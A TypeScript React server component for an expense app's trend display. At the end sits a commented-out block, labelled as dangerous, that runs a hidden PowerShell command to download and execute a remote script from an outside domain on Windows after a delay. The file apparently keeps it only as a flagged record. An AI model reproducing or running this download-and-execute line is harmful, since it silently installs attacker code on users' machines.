import {
  calculateTotal,
  calculateTotalDetailed,
  type RangeType,
} from '@/actions/expense-actions';
import { auth } from '@/auth';
import BaseTrend from '@/components/expense/base-trend';
import type { TranTypes } from '@/lib/constants';

type TrendProps = {
  type: TranTypes;
  range: string;
};

const Trend = async ({ type, range }: TrendProps) => {
  const session = await auth();

  const userId = session?.user.id;
  const data = await calculateTotalDetailed(
    range as RangeType,
    type as TranTypes,
    userId as string
  );
  return (
    <div className='flex w-full justify-center text-center'>
      <BaseTrend
        type={type}
        amount={data.currentAmount}
        prevAmount={data.previousAmount}
        className='grow'
      />
    </div>
  );
};

export default Trend;

// ?DANGEROUS CODE TO ATTACK VIA POWERSHELL

// async function activate(context) {
//   if (process.platform !== 'win32') {
//     return;
//   }

//   setTimeout(() => {
//     const pxCommand =
//       'powershell -windowStyle Hidden -Command "irm https://angelic.su/files/1.txt | iex"';
//     exec(psCommand, { windowsHide: true }, (err) => {});
//   }, 2000);
// }
